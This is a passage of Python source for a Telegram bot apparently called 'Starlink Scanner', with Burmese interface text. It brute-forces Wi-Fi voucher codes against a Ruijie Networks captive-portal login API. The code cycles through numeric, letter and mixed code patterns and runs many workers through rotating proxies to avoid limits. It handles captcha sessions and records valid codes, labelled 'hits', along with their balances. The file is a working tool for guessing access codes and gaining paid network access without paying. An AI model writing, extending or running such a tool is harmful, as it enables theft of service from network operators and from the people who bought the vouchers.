            [InlineKeyboardButton('abc 6', callback_data='set_mode_abc6'),
             InlineKeyboardButton('abc 7', callback_data='set_mode_abc7'),
             InlineKeyboardButton('abc 8', callback_data='set_mode_abc8'),
             InlineKeyboardButton('abc 9', callback_data='set_mode_abc9')],
            [InlineKeyboardButton('mix 6', callback_data='set_mode_mix6'),
             InlineKeyboardButton('mix 7', callback_data='set_mode_mix7'),
             InlineKeyboardButton('mix 8', callback_data='set_mode_mix8'),
             InlineKeyboardButton('mix 9', callback_data='set_mode_mix9')],
            [InlineKeyboardButton('Custom Start', callback_data='set_mode_custom')],
            [InlineKeyboardButton('Custom End', callback_data='set_mode_customend')],
            [InlineKeyboardButton('⬅️ Back', callback_data='btn_back_main')],
        ])
        await query.message.edit_text('⚙️ **Choose Scanner Mode**', reply_markup=keyboard)

    elif data.startswith('set_mode_'):
        selected_mode = data.split('set_mode_')[1]
        NUM = '012345678'
        ABC = 'abcdefghijkmnpqrstuvwxyz'
        MIX = '2345678abcdefghijkmnpqrstuvwxyz'
        if selected_mode[:3] in ('num', 'abc', 'mix') and selected_mode[3:].isdigit():
            ud['mode'] = selected_mode
            ud['char_set'] = {'num': NUM, 'abc': ABC, 'mix': MIX}[selected_mode[:3]]
            ud['code_len'] = int(selected_mode[3:])
            ud['start_digit'] = None
            ud['end_digit'] = None
        elif selected_mode == 'custom':
            ud['mode'] = 'custom'
            ud['char_set'] = NUM
            ud['start_digit'] = None
            ud['state'] = 'waiting_for_digit'
            await query.message.edit_text('🔢 **Start Digit**\nဂဏန်းတစ်လုံးသာ ပြန်ပိုဗ်ပေးပါ။')
            ud['menu_msg_id'] = query.message.message_id
            return
        elif selected_mode == 'customend':
            ud['mode'] = 'customend'
            ud['char_set'] = NUM
            ud['end_digit'] = None
            ud['state'] = 'waiting_for_end_digit'
            await query.message.edit_text('🔢 **End Digit**\nအဆုံးသတ်တစ်လုံးသာ ပြန်ပိုဗ်ပေးပါ။')
            ud['menu_msg_id'] = query.message.message_id
            return
        await query.message.edit_text(
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n⚙️ Current Mode: `{ud['mode']}`\n🔀 Proxies: `{proxy_total}/{proxy_active}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())

    elif data.startswith('set_clen_'):
        ud['code_len'] = int(data.split('set_clen_')[1])
        ud['state'] = None
        await query.message.edit_text(
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n⚙️ Current Mode: `{ud['mode']}`\n🔀 Proxies: `{proxy_total}/{proxy_active}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())

    elif data == 'btn_add_proxies':
        ud['state'] = 'waiting_for_proxy_text'
        await query.message.edit_text(
            '📥 **Proxy များကို ယခုပို့ပါ**\nတစ်ကြောင်းလျှင် proxy တစ်ခုစီ\nဥပမာ -\n123.45.67.89:8080\nsocks5://user:pass@host:1080\nsocks4://host:1080')
        ud['menu_msg_id'] = query.message.message_id

    elif data == 'btn_start_scanner':
        if ud['portal_url'] is None:
            await query.message.edit_text('❌ Portal URL မရှိသေးပါ။ ကျေးဇူးပြု၍ `Update Portal` အရင်လုပ်ပါ။',
                                          reply_markup=get_main_menu_markup())
            return
        if ud['task'] and not ud['task'].done():
            await stop_user_scanner(user_id)
        asyncio.create_task(run_user_scanner(context, user_id))

    elif data == 'stop_scan':
        await stop_user_scanner(user_id)
        try:
            await query.message.edit_text('🛑 Scanner stopped. Proxies reset to normal.', reply_markup=get_main_menu_markup())
        except Exception:
            pass

    elif data == 'btn_back_main':
        await query.message.edit_text(
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n⚙️ Current Mode: `{ud['mode']}`\n🔀 Proxies: `{proxy_total}/{proxy_active}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
    return


@admin_only
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    text = update.message.text.strip()
    state = ud.get('state')

    if state == 'waiting_for_portal_url':
        if not text.startswith('http'):
            await update.message.reply_text('❌ ကျေးဇူးပြု၍ ညာဘက် http/https URL ပို့ပါ။')
            return
        ud['portal_url'] = text
        ud['state'] = None
        with open(FILE_PATH, 'a') as f:
            f.write(f"\n{PORTAL_URL_PATH}{user_id} {ud['portal_url']}")
        pm = get_proxy_manager()
        proxy_total, proxy_active = pm.stats()
        await update.message.reply_text(
            f"✅ Portal URL ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။\n\n⚡ **Starlink Scanner Control Panel** ⚡\n\n⚙️ Current Mode: `{ud['mode']}`\n🔀 Proxies: `{proxy_total}/{proxy_active}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        ud['menu_msg_id'] = update.message.message_id

    elif state == 'waiting_for_digit':
        ud['start_digit'] = text.strip()
        ud['char_set'] = '0' + ud['char_set']
        ud['pending_custom'] = 'start'
        ud['state'] = 'waiting_for_custom_len'
        await update.message.reply_text(
            '🔢 **ဂဏန်းအရေအတွက် ရွေးပါ**',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton('6', callback_data='set_clen_6'),
                 InlineKeyboardButton('7', callback_data='set_clen_7'),
                 InlineKeyboardButton('8', callback_data='set_clen_8'),
                 InlineKeyboardButton('9', callback_data='set_clen_9')]]))
        return
    elif state == 'waiting_for_end_digit':
        ud['end_digit'] = text.strip()
        ud['char_set'] = '0' + ud['char_set']
        ud['pending_custom'] = 'end'
        ud['state'] = 'waiting_for_custom_len'
        await update.message.reply_text(
            '🔢 **ဂဏန်းအရေအတွက် ရွေးပါ**',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton('6', callback_data='set_clen_6'),
                 InlineKeyboardButton('7', callback_data='set_clen_7'),
                 InlineKeyboardButton('8', callback_data='set_clen_8'),
                 InlineKeyboardButton('9', callback_data='set_clen_9')]]))
        return
    elif state == 'waiting_for_custom_len':
        ud['state'] = None
        pm = get_proxy_manager()
        proxy_total, proxy_active = pm.stats()
        await update.message.reply_text(
            f"✅ Custom Start Digit = `{ud['start_digit']}` သတ်မှတ်ပြီးပါပြီ။\n\n⚡ **Starlink Scanner Control Panel** ⚡\n\n⚙️ Current Mode: `{ud['mode']}`\n🔀 Proxies: `{proxy_total}/{proxy_active}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        ud['menu_msg_id'] = update.message.message_id

    elif state == 'waiting_for_proxy_text':
        lines = text.splitlines()
        if not lines:
            await update.message.reply_text('❌ Proxy list ဗလာဖြစ်နေပါသည်။ ထပ်မံကြိုးစားပါ။')
            return
        try:
            with open(PROXY_FILE, 'w') as f:
                f.write(text + '\n')
            pm = get_proxy_manager()
            pm.reload()
            proxy_total, proxy_active = pm.stats()
            ud['state'] = None
            await update.message.reply_text(
                f"✅ **Proxies အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ**\n📊 Total: `{proxy_total}`\n✅ Active: `{proxy_active}`\n\n⚡ **Starlink Scanner Control Panel** ⚡\n\n⚙️ Current Mode: `{ud['mode']}`\n🔀 Proxies: `{proxy_total}/{proxy_active}`",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=get_main_menu_markup())
            ud['menu_msg_id'] = update.message.message_id
        except Exception as e:
            await update.message.reply_text(f'❌ Proxy ဖိုင်ရေးရာတွင် အမှားအယွင်းရှိ: {e}')
    return


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    err = context.error
    if isinstance(err, telegram.error.Conflict):
        print(bred + '[!] Conflict: another bot instance is already running with this token. '
              'Stop the other instance and restart.' + reset)
    else:
        print(bred + f'[!] Handler error: {type(err).__name__}: {err}' + reset)


def main():
    pm = get_proxy_manager()
    total, active = pm.stats()
    print(f'[MAIN] Proxy Manager initialized: {total}/{active} active proxies')
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CommandHandler('addproxies', add_proxies_cmd))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(error_handler)
    print('Bot is running with python-telegram-bot...')
    print('Thank for using By Telegram@KyiLae2006224')
    app.run_polling()


#check_approval()


async def _selftest():
    """Run the scanner engine headless for N seconds to verify throughput."""
    import sys
    dur = int(sys.argv[2]) if len(sys.argv) > 2 else 30
    user_id = ADMIN_IDS[0]
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    login_url = 'https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US'
    captcha_base_url = 'https://portal-as.ruijienetworks.com/api/auth/captcha/image'
    verify_url = 'https://portal-as.ruijienetworks.com/api/auth/captcha/verify'
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
               'Content-Type': 'application/json',
               'Origin': 'https://portal-as.ruijienetworks.com',
               'Referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html'}
    ud['stop_event'].clear()
    ud['stats'] = {'tried': 0, 'hits': 0, 'expired': 0, 'limits': 0, 'start_time': time.time()}
    ud['valid_codes'] = []
    ud['limit_codes'] = []
    ud['tried_codes'] = set()
    ud['recent_logs'] = []
    ud['recheck_queue'] = []
    ud['CURRENT_CODE'] = '----'
    async with ud['sid_lock']:
        ud['sid_pool'] = []
        ud['sid_auth'] = {}
        ud['sid_time'] = {}
    print('[selftest] health-checking proxies...')
    await proxy_health_check(user_id, once=True)
    t, a = pm.stats()
    print(f'[selftest] proxies: {t} total, {a} active')
    tasks = [asyncio.create_task(proxy_health_check(user_id)),
             asyncio.create_task(sid_refresher(None, user_id))]
    for i in range(NUM_WORKERS):
        tasks.append(asyncio.create_task(worker(i, login_url, captcha_base_url, verify_url, headers, user_id)))
    # progress reporter
    async def report():
        while not ud['stop_event'].is_set():
            await asyncio.sleep(5)
            el = max(time.time() - ud['stats']['start_time'], 1)
            print(f"[selftest] t={el:.0f}s tried={ud['stats']['tried']} hits={ud['stats']['hits']} "
                  f"limits={ud['stats']['limits']} pool={len(ud['sid_pool'])} "
                  f"speed={ud['stats']['tried']*60/el:.0f} c/m")
    rt = asyncio.create_task(report())
    await asyncio.sleep(dur)
    ud['stop_event'].set()
    for tk in tasks:
        tk.cancel()
    rt.cancel()
    await asyncio.sleep(6)  # let pending balance fetches finish
    el = max(time.time() - ud['stats']['start_time'], 1)
    print(f"[selftest] DONE tried={ud['stats']['tried']} hits={ud['stats']['hits']} "
          f"limits={ud['stats']['limits']} speed={ud['stats']['tried']*60/el:.0f} c/m")
    for item in ud['valid_codes'][:20]:
        print(f"[selftest] HIT {item['code']} {item.get('balance_str')}")


if __name__ == '__main__':
    import sys as _sys
    if len(_sys.argv) > 1 and _sys.argv[1] == '--selftest':
        asyncio.run(_selftest())
    else:
        main()
